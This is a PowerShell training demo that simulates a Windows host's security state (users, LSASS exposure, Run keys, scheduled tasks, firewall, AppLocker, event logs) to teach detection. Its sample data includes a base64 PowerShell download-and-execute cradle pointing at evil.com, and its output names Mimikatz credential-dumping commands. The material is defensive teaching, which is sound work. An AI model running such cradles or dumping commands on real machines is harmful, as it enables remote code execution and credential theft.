# Windows Security Features Demo - Data Loader and Simulation Functions
# Simulates Windows security environment using PowerShell Core on Linux

# ============================================================
# SIMULATED DATA: Windows Security State
# ============================================================

$global:SimulatedUsers = @(
    [PSCustomObject]@{
        Name = "Administrator"; SID = "S-1-5-21-3451889304-1417148862-2043384429-500"
        Enabled = $false; PasswordNeverExpires = $true; Groups = @("Administrators")
    },
    [PSCustomObject]@{
        Name = "Guest"; SID = "S-1-5-21-3451889304-1417148862-2043384429-501"
        Enabled = $false; PasswordNeverExpires = $true; Groups = @("Guests")
    },
    [PSCustomObject]@{
        Name = "alice"; SID = "S-1-5-21-3451889304-1417148862-2043384429-1001"
        Enabled = $true; PasswordNeverExpires = $false; Groups = @("Users")
    },
    [PSCustomObject]@{
        Name = "devops"; SID = "S-1-5-21-3451889304-1417148862-2043384429-1002"
        Enabled = $true; PasswordNeverExpires = $true; Groups = @("Administrators","Users")
    }
)

$global:SimulatedRunKeys = @{
    HKLM = @(
        [PSCustomObject]@{ Name="SecurityHealth"; Value="C:\Windows\System32\SecurityHealthSystray.exe"; Status="LEGITIMATE" },
        [PSCustomObject]@{ Name="OneDriveSetup"; Value="C:\Windows\SysWOW64\OneDriveSetup.exe"; Status="LEGITIMATE" },
        [PSCustomObject]@{ Name="WindowsUpdtr"; Value="C:\Users\alice\AppData\Local\Temp\svc.exe"; Status="SUSPICIOUS" }
    )
    HKCU = @()
}

$global:SimulatedScheduledTasks = @(
    [PSCustomObject]@{
        Name="Adobe Acrobat Update Task"; Path="\Adobe\"; RunAs="NT AUTHORITY\SYSTEM"
        Action="C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe"
        Trigger="Daily"; EncodedCommand=$null; Status="NORMAL"
    },
    [PSCustomObject]@{
        Name="Google Update Task"; Path="\Google\"; RunAs="NT AUTHORITY\SYSTEM"
        Action="C:\Program Files (x86)\Google\Update\GoogleUpdate.exe /c"
        Trigger="Hourly"; EncodedCommand=$null; Status="NORMAL"
    },
    [PSCustomObject]@{
        Name="Windows Telemetry Helper"; Path="\"; RunAs="NT AUTHORITY\SYSTEM"
        Action="powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACAALQBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
        Trigger="AtLogon"; EncodedCommand="SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACAALQBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="; Status="SUSPICIOUS"
    }
)

$global:SimulatedFirewall = @{
    Profiles = @(
        [PSCustomObject]@{ Profile="Domain"; Enabled=$true; DefaultInboundAction="Block"; DefaultOutboundAction="Allow"; Status="PASS" },
        [PSCustomObject]@{ Profile="Private"; Enabled=$true; DefaultInboundAction="Block"; DefaultOutboundAction="Allow"; Status="PASS" },
        [PSCustomObject]@{ Profile="Public"; Enabled=$true; DefaultInboundAction="Block"; DefaultOutboundAction="Allow"; Status="PASS" }
    )
    RiskyRules = @(
        [PSCustomObject]@{ Name="File and Printer Sharing (SMB-In)"; Port=445; Status="WARN" },
        [PSCustomObject]@{ Name="Remote Desktop (TCP-In)"; Port=3389; Status="WARN" },
        [PSCustomObject]@{ Name="WMI-In (DCOM)"; Port=135; Status="WARN" },
        [PSCustomObject]@{ Name="AllowAll-Inbound"; Port="ANY"; Status="CRITICAL"; Created="2024-01-14 03:22:18 UTC"; CreatedBy="NT AUTHORITY\SYSTEM" }
    )
}

$global:SimulatedLsass = @{
    Credentials = @(
        [PSCustomObject]@{ Type="NTLM Hashes"; Count=3; Protected=$false },
        [PSCustomObject]@{ Type="Kerberos Tickets"; Count=2; Protected=$false },
        [PSCustomObject]@{ Type="Wdigest Plaintext"; Count=3; Protected=$false; Risk="CRITICAL: Wdigest enabled - plaintext passwords stored!" }
    )
    RunAsPPL = $false
    CredentialGuard = $false
}

# ============================================================
# DISPLAY FUNCTIONS
# ============================================================

function Show-Help {
    Write-Host "`n=== Windows Security Demo — Available Commands ===" -ForegroundColor Cyan
    Write-Host "Show-LocalUsers           - Display user accounts with SIDs and group memberships"
    Write-Host "Show-AccessToken [user]   - Show token structure and integrity levels"
    Write-Host "Show-LsassCredentials     - Show credential types stored in LSASS"
    Write-Host "Describe-CredentialGuard  - Explain Credential Guard protection model"
    Write-Host "Describe-LsaProtection    - Explain LSA Protected Process Light"
    Write-Host "Show-SysmonEvent10Pattern - Show Sysmon LSASS access detection pattern"
    Write-Host "Show-RegistryPersistence  - Show registry Run key contents"
    Write-Host "Investigate-RunKey [name] - Analyze a specific Run key entry"
    Write-Host "Show-WinlogonKeys         - Check Winlogon for shell/userinit tampering"
    Write-Host "Show-FirewallProfiles     - Check firewall profile configuration"
    Write-Host "Show-FirewallRiskyRules   - List enabled risky inbound rules"
    Write-Host "Get-FirewallRuleDetails [name] - Get details of a specific rule"
    Write-Host "Show-AppLockerPolicy      - Display simulated AppLocker policy"
    Write-Host "Test-AppLockerFile [path] - Test if a path is allowed or blocked"
    Write-Host "Show-ScheduledTasks       - List non-Microsoft scheduled tasks"
    Write-Host "Decode-ScheduledTask [name] - Decode encoded task commands"
    Write-Host "Show-SecurityEvents -Type [Attack|All] - Show security event patterns"
    Write-Host ""
}

function Show-LocalUsers {
    Write-Host "`n=== Local User Accounts ===" -ForegroundColor Cyan
    $global:SimulatedUsers | ForEach-Object {
        $color = if ($_.Enabled -and "Administrators" -in $_.Groups) { "Red" }
                 elseif (-not $_.Enabled) { "DarkGray" }
                 else { "White" }
        $flag = if ("Administrators" -in $_.Groups -and $_.Enabled) { "  *** IN ADMINISTRATORS ***" } else { "" }
        $pwFlag = if ($_.PasswordNeverExpires) { "[PasswordNeverExpires]" } else { "" }
        Write-Host "  $($_.Name)" -ForegroundColor $color -NoNewline
        Write-Host "  SID: $($_.SID)" -ForegroundColor DarkGray -NoNewline
        Write-Host "  Enabled: $($_.Enabled)  Groups: $($_.Groups -join ',')  $pwFlag$flag"
    }
}

function Show-AccessToken {
    param([string]$User = "devops")
    Write-Host "`n=== Access Token Structure for: $User ===" -ForegroundColor Cyan
    if ($User -eq "devops") {
        Write-Host "  TokenType:          Primary (interactive logon session)" -ForegroundColor White
        Write-Host "  IntegrityLevel:     Medium (0x2000) — standard user processes" -ForegroundColor Yellow
        Write-Host "  ElevatedToken:      High   (0x3000) — admin operations (UAC prompt required)" -ForegroundColor Yellow
        Write-Host "  User SID:           S-1-5-21-...-1002 (devops)" -ForegroundColor White
        Write-Host "  Group SIDs:" -ForegroundColor White
        Write-Host "    S-1-5-21-...-513  (Domain Users)" -ForegroundColor DarkGray
        Write-Host "    S-1-5-21-...-544  (Administrators — DISABLED until UAC elevation)" -ForegroundColor Yellow
        Write-Host "    S-1-1-0           (Everyone)" -ForegroundColor DarkGray
        Write-Host "    S-1-5-11          (Authenticated Users)" -ForegroundColor DarkGray
        Write-Host "  Privileges (relevant ones):" -ForegroundColor White
        Write-Host "    SeShutdownPrivilege       Disabled" -ForegroundColor DarkGray
        Write-Host "    SeChangeNotifyPrivilege   Enabled" -ForegroundColor Green
        Write-Host "    SeDebugPrivilege          Disabled (enabled only if admin!)" -ForegroundColor Yellow
    }
    Write-Host "`n  KEY INSIGHT: The Administrators SID is DISABLED in the Medium token."
    Write-Host "  This is why UAC elevation is required — it enables the token's admin capabilities."
}

function Show-LsassCredentials {
    Write-Host "`n=== LSASS Credential Storage Analysis ===" -ForegroundColor Cyan
    Write-Host "  LSA Protection (RunAsPPL): " -NoNewline
    if ($global:SimulatedLsass.RunAsPPL) { Write-Host "ENABLED (protected)" -ForegroundColor Green }
    else { Write-Host "DISABLED - LSASS can be accessed by admin processes!" -ForegroundColor Red }

    Write-Host "  Credential Guard:          " -NoNewline
    if ($global:SimulatedLsass.CredentialGuard) { Write-Host "ENABLED (VBS isolation)" -ForegroundColor Green }
    else { Write-Host "DISABLED - credentials stored in accessible memory!" -ForegroundColor Red }

    Write-Host "`n  Credential Types in LSASS:" -ForegroundColor White
    $global:SimulatedLsass.Credentials | ForEach-Object {
        $color = if ($_.Risk) { "Red" } else { "Yellow" }
        Write-Host "    $($_.Type): $($_.Count) entries" -ForegroundColor $color
        if ($_.Risk) { Write-Host "      *** $($_.Risk) ***" -ForegroundColor Red }
    }
    Write-Host "`n  WHAT MIMIKATZ COULD EXTRACT:" -ForegroundColor Red
    Write-Host "    sekurlsa::logonpasswords — dumps NTLM hashes AND plaintext (Wdigest!)"
    Write-Host "    sekurlsa::kerberos      — dumps Kerberos tickets"
    Write-Host "    lsadump::sam            — dumps SAM database hashes"
}

function Describe-CredentialGuard {
    Write-Host "`n=== Credential Guard Protection Model ===" -ForegroundColor Cyan
    Write-Host @"
  Credential Guard uses Virtualization-Based Security (VBS) to isolate LSASS:

  Normal LSASS (without Credential Guard):
  ┌─────────────────────────────────────────┐
  │  Windows OS (Ring 0)                    │
  │  ┌────────────────────────────────────┐ │
  │  │  LSASS process (Ring 3)            │ │
  │  │  Hashes: ACCESSIBLE to Ring 0      │ │  <-- Mimikatz works here
  │  └────────────────────────────────────┘ │
  └─────────────────────────────────────────┘

  With Credential Guard:
  ┌─────────────────────────────────────────┐
  │  Hypervisor (VTL1 - secure world)        │
  │  ┌────────────────────────────────────┐ │
  │  │  LSAIso (Isolated LSASS)           │ │  <-- Credential material here
  │  │  Hashes: INACCESSIBLE from VTL0    │ │
  │  └────────────────────────────────────┘ │
  ├─────────────────────────────────────────┤
  │  Windows OS (VTL0 - normal world)        │
  │  ┌────────────────────────────────────┐ │
  │  │  LSASS stub process                │ │  <-- Only has tickets/tokens
  │  │  No credentials stored here        │ │  <-- Mimikatz finds nothing
  │  └────────────────────────────────────┘ │
  └─────────────────────────────────────────┘
"@
}

function Describe-LsaProtection {
    Write-Host "`n=== LSA Protected Process Light (RunAsPPL) ===" -ForegroundColor Cyan
    Write-Host @"
  RunAsPPL makes LSASS a Protected Process Light:
  - LSASS is launched with a special protection flag
  - Only processes signed by Microsoft can open a handle to it
  - Prevents tools like Mimikatz, ProcDump from accessing LSASS memory
  
  Registry setting:
    HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1 (DWORD)
  
  Detection bypass attempts:
  - Attackers use kernel exploits to disable PPL
  - Attackers use vulnerable drivers to bypass (BYOVD - Bring Your Own Vulnerable Driver)
  - Monitor for: kernel driver loads from non-standard paths (Sysmon Event 6)
"@
}

function Show-SysmonEvent10Pattern {
    Write-Host "`n=== Sysmon Event ID 10: LSASS Access Detection ===" -ForegroundColor Cyan
    Write-Host @"
  Event 10 is generated when a process opens a handle to another process.
  
  Malicious LSASS access pattern:
  
  <Event>
    <EventID>10</EventID>
    <TimeCreated>2024-01-14 14:48:02</TimeCreated>
    <SourceProcessId>4712</SourceProcessId>
    <SourceImage>C:\Users\alice\AppData\Local\Temp\dump.exe</SourceImage>
    <TargetImage>C:\Windows\system32\lsass.exe</TargetImage>
    <GrantedAccess>0x1010</GrantedAccess>
    <!-- 0x1010 = PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION -->
  </Event>
  
  High-risk GrantedAccess values for LSASS:
    0x1010  PROCESS_VM_READ + PROCESS_QUERY  (credential read)
    0x1fffff PROCESS_ALL_ACCESS               (maximum access - very suspicious)
    0x1410  PROCESS_VM_READ + PROCESS_DUP    (token theft)
  
  Baseline: ONLY lsass.exe and werfault.exe should touch lsass.exe.
  Any other process accessing lsass.exe with read access = investigate immediately.
"@
}

function Show-RegistryPersistence {
    Write-Host "`n=== Registry Persistence Locations ===" -ForegroundColor Cyan
    Write-Host "  HKLM Run Keys (system-wide autostart):" -ForegroundColor White
    $global:SimulatedRunKeys.HKLM | ForEach-Object {
        $color = if ($_.Status -eq "SUSPICIOUS") { "Red" } else { "Green" }
        $icon = if ($_.Status -eq "SUSPICIOUS") { "  *** SUSPICIOUS ***" } else { "" }
        Write-Host "    $($_.Name): $($_.Value)" -ForegroundColor $color -NoNewline
        Write-Host "$icon"
    }
    Write-Host "`n  HKCU Run Keys (per-user autostart):" -ForegroundColor White
    if ($global:SimulatedRunKeys.HKCU.Count -eq 0) { Write-Host "    (empty)" -ForegroundColor Green }
    else { $global:SimulatedRunKeys.HKCU | ForEach-Object { Write-Host "    $($_.Name): $($_.Value)" } }
}

function Investigate-RunKey {
    param([string]$Name)
    $entry = $global:SimulatedRunKeys.HKLM | Where-Object { $_.Name -eq $Name }
    if (-not $entry) { Write-Host "Entry not found: $Name" -ForegroundColor Red; return }
    Write-Host "`n=== Investigating Run Key: $Name ===" -ForegroundColor Cyan
    Write-Host "  Path:     $($entry.Value)"
    Write-Host "  Signed:   " -NoNewline
    if ($entry.Status -eq "SUSPICIOUS") {
        Write-Host "FALSE (no digital signature)" -ForegroundColor Red
        Write-Host "  Location: TEMP directory - NEVER legitimate for autostart" -ForegroundColor Red
        Write-Host "  Hash:     SHA256: a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890"
        Write-Host "  Status:   " -NoNewline
        Write-Host "HIGH SUSPICION - Remove and investigate" -ForegroundColor Red
        Write-Host "`n  Remediation:"
        Write-Host "    1. Check if file exists: Test-Path '$($entry.Value)'"
        Write-Host "    2. Get hash: Get-FileHash '$($entry.Value)' -Algorithm SHA256"
        Write-Host "    3. Check VirusTotal for the hash"
        Write-Host "    4. If malicious: Remove-ItemProperty -Path 'HKLM:\...\Run' -Name '$Name'"
    } else {
        Write-Host "TRUE (Microsoft signature)" -ForegroundColor Green
    }
}

function Show-WinlogonKeys {
    Write-Host "`n=== Winlogon Security Keys ===" -ForegroundColor Cyan
    Write-Host "  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    Write-Host "  Userinit = C:\Windows\system32\userinit.exe," -ForegroundColor Green
    Write-Host "  Shell    = explorer.exe" -ForegroundColor Green
    Write-Host "`n  Status: CLEAN" -ForegroundColor Green
    Write-Host "`n  Malware indicators to watch for:"
    Write-Host "    Userinit = userinit.exe,C:\backdoor.exe  (extra process added)" -ForegroundColor DarkRed
    Write-Host "    Shell    = explorer.exe,C:\malware.exe   (extra process added)" -ForegroundColor DarkRed
    Write-Host "    Shell    = C:\Users\alice\malware.exe    (explorer replaced!)" -ForegroundColor Red
}

function Show-FirewallProfiles {
    Write-Host "`n=== Windows Firewall Profile Status ===" -ForegroundColor Cyan
    $global:SimulatedFirewall.Profiles | ForEach-Object {
        $color = if ($_.Status -eq "PASS") { "Green" } else { "Red" }
        Write-Host "  $($_.Profile): Enabled=$($_.Enabled), Inbound=$($_.DefaultInboundAction), Outbound=$($_.DefaultOutboundAction) [$($_.Status)]" -ForegroundColor $color
    }
}

function Show-FirewallRiskyRules {
    Write-Host "`n=== Risky Enabled Inbound Rules ===" -ForegroundColor Cyan
    $global:SimulatedFirewall.RiskyRules | ForEach-Object {
        $color = if ($_.Status -eq "CRITICAL") { "Red" } elseif ($_.Status -eq "WARN") { "Yellow" } else { "Green" }
        Write-Host "  [$($_.Status)] $($_.Name) — Port: $($_.Port)" -ForegroundColor $color
    }
}

function Get-FirewallRuleDetails {
    param([string]$Name)
    $rule = $global:SimulatedFirewall.RiskyRules | Where-Object { $_.Name -eq $Name }
    if (-not $rule) { Write-Host "Rule not found: $Name" -ForegroundColor Red; return }
    Write-Host "`n=== Firewall Rule Details: $Name ===" -ForegroundColor Cyan
    Write-Host "  Status:    $($rule.Status)" -ForegroundColor Red
    if ($rule.Created) {
        Write-Host "  Created:   $($rule.Created)" -ForegroundColor Red
        Write-Host "  CreatedBy: $($rule.CreatedBy)" -ForegroundColor Red
        Write-Host "`n  ANALYSIS: Rule created at 03:22 UTC by SYSTEM - middle of the night!"
        Write-Host "  This strongly suggests a compromised process or malware created this rule."
        Write-Host "  Recommendation: DELETE this rule immediately and investigate."
    }
}

function Show-AppLockerPolicy {
    Write-Host "`n=== AppLocker Policy (Effective Rules) ===" -ForegroundColor Cyan
    Write-Host "  EXE Rules:" -ForegroundColor White
    Write-Host "    ALLOW: Publisher contains 'MICROSOFT CORPORATION'" -ForegroundColor Green
    Write-Host "    ALLOW: Publisher contains 'ADOBE INC'" -ForegroundColor Green
    Write-Host "    ALLOW: Path = %PROGRAMFILES%\*" -ForegroundColor Green
    Write-Host "    BLOCK: Path = %TEMP%\*" -ForegroundColor Red
    Write-Host "    BLOCK: Path = %USERPROFILE%\Downloads\*" -ForegroundColor Red
    Write-Host "  Script Rules:" -ForegroundColor White
    Write-Host "    ALLOW: Publisher = MICROSOFT CORPORATION" -ForegroundColor Green
    Write-Host "    BLOCK: Path = C:\Users\*\.ps1" -ForegroundColor Red
    Write-Host "  MSI Rules:" -ForegroundColor White
    Write-Host "    ALLOW: Publisher = MICROSOFT CORPORATION, ORACLE CORPORATION" -ForegroundColor Green
    Write-Host "    BLOCK: (everything else)" -ForegroundColor Red
}

function Test-AppLockerFile {
    param([string]$Path)
    Write-Host "`n=== AppLocker Test: $Path ===" -ForegroundColor Cyan
    if ($Path -match "System32|Program Files|SysWOW64") {
        Write-Host "  Result: ALLOWED (system path)" -ForegroundColor Green
    } elseif ($Path -match "Temp|AppData\\Local\\Temp|Downloads") {
        Write-Host "  Result: BLOCKED (execution from Temp/Downloads is denied)" -ForegroundColor Red
        Write-Host "  Rule:   Path rule: Block %TEMP%\*"
    } elseif ($Path -match "7-Zip|notepad|calc") {
        Write-Host "  Result: ALLOWED (common application path)" -ForegroundColor Green
    } else {
        Write-Host "  Result: BLOCKED (not in allow rules)" -ForegroundColor Red
    }
}

function Show-ScheduledTasks {
    Write-Host "`n=== Non-Microsoft Scheduled Tasks ===" -ForegroundColor Cyan
    $global:SimulatedScheduledTasks | ForEach-Object {
        $color = if ($_.Status -eq "SUSPICIOUS") { "Red" } else { "White" }
        Write-Host "  Name: $($_.Name)" -ForegroundColor $color
        Write-Host "    Path: $($_.Path)  RunAs: $($_.RunAs)  Trigger: $($_.Trigger)"
        if ($_.EncodedCommand) {
            Write-Host "    Action: $($_.Action.Substring(0,[Math]::Min(80,$_.Action.Length)))..." -ForegroundColor Red
            Write-Host "    *** Encoded command detected! Use Decode-ScheduledTask '$($_.Name)' ***" -ForegroundColor Red
        } else {
            Write-Host "    Action: $($_.Action)"
        }
        Write-Host ""
    }
}

function Decode-ScheduledTask {
    param([string]$Name)
    $task = $global:SimulatedScheduledTasks | Where-Object { $_.Name -eq $Name }
    if (-not $task -or -not $task.EncodedCommand) {
        Write-Host "Task not found or no encoded command: $Name" -ForegroundColor Red
        return
    }
    Write-Host "`n=== Decoding Task: $Name ===" -ForegroundColor Cyan
    $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($task.EncodedCommand))
    Write-Host "  Base64 Decoded Command:" -ForegroundColor Yellow
    Write-Host "  $decoded" -ForegroundColor Red
    Write-Host "`n  ANALYSIS:" -ForegroundColor White
    Write-Host "    IEX = Invoke-Expression (executes whatever follows)" -ForegroundColor Red
    Write-Host "    New-Object Net.WebClient = create HTTP downloader" -ForegroundColor Red
    Write-Host "    DownloadString() = fetch remote script into memory" -ForegroundColor Red
    Write-Host "    'http://evil.com/payload.ps1' = remote C2 server" -ForegroundColor Red
    Write-Host "`n  VERDICT: PowerShell web cradle - downloads and executes remote code at every logon"
    Write-Host "  This is a classic fileless persistence mechanism." -ForegroundColor Red
}

function Show-SecurityEvents {
    param([string]$Type = "Attack")
    Write-Host "`n=== Security Event Log Patterns ===" -ForegroundColor Cyan
    if ($Type -in @("Attack","All")) {
        Write-Host "`n  PATTERN 1: Brute Force (Event ID 4625)" -ForegroundColor Yellow
        Write-Host "  14:23:01 - 4625 - Failed logon: alice from 192.168.100.50 (Type 3, Network)"
        Write-Host "  14:23:02 - 4625 - Failed logon: alice from 192.168.100.50 (Type 3, Network)"
        Write-Host "  ... (247 total failures) ..."
        Write-Host "  14:47:23 - 4624 - Successful logon: alice from 192.168.100.50 (Type 3, Network)" -ForegroundColor Red

        Write-Host "`n  PATTERN 2: Credential Dumping (Sysmon Event 10)" -ForegroundColor Yellow
        Write-Host "  14:48:02 - Sysmon 10 - ProcessAccess:" -ForegroundColor Red
        Write-Host "    Source: C:\Users\alice\AppData\Local\Temp\dump.exe (PID:4712)" -ForegroundColor Red
        Write-Host "    Target: C:\Windows\system32\lsass.exe" -ForegroundColor Red
        Write-Host "    GrantedAccess: 0x1010 (PROCESS_VM_READ)" -ForegroundColor Red

        Write-Host "`n  PATTERN 3: Persistence via Service (Event 7045)" -ForegroundColor Yellow
        Write-Host "  14:50:15 - 7045 - New Service Installed:" -ForegroundColor Red
        Write-Host "    Service Name: Windows Telemetry Helper" -ForegroundColor Red
        Write-Host "    Path: C:\ProgramData\svchost.exe  (NOT system32!)" -ForegroundColor Red
        Write-Host "    Start Type: Automatic" -ForegroundColor Red
        Write-Host "    Account: LocalSystem" -ForegroundColor Red

        Write-Host "`n  ANTI-FORENSICS (Event 1102)" -ForegroundColor Yellow
        Write-Host "  15:10:44 - 1102 - Security audit log cleared by CORP\alice" -ForegroundColor Red
        Write-Host "  *** Log clearing after attack = attacker destroying evidence ***" -ForegroundColor Red
    }
}

Write-Host "Windows Security Demo data loaded." -ForegroundColor Green
Write-Host "Type Show-Help to see available commands." -ForegroundColor Cyan
